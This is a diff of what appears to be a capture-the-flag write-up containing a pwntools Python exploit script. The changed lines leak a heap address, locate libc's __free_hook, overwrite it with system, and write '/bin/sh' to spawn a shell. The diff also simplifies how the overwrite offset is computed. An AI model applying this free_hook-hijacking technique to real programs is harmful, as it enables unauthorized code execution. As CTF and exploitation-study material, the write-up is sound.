@@ -13,9 +13,6 @@ authors:
 ```python
 from pwn import *
 
-def isPow2(x):
-    return (x & (x - 1)) == 0;
-
 def wiWaIfy(n):
     def helper(n):
         if n == 1:
@@ -97,7 +94,7 @@ while len(r) < 8:
 happa = u64(r) - 0x80
 print "Happa: %lx" % happa
 
-#phase 3 - overwrite libc's free_hook (cause GOT is rdonly!)
+#phase 3 - overwrite libc's free_hook (cause GOT is rdonly)
 free_hook = libc + libc_elf.symbols["__free_hook"]
 
 print "free_hook_ptr: %lx" % free_hook_ptr 
@@ -105,10 +102,7 @@ print "free_hook_ptr: %lx" % free_hook_ptr
 off = (free_hook_ptr - happa)
 print "Offset: %lx" % off
 
-import math
-addr = wiWaIfy(off)
-
-write(addr, p64(libc + libc_elf.symbols["system"]))
+write(off, p64(libc + libc_elf.symbols["system"]))
 write(0x20, "/bin/sh\x00") #A
 
 p.sendline("NOM-NOM")
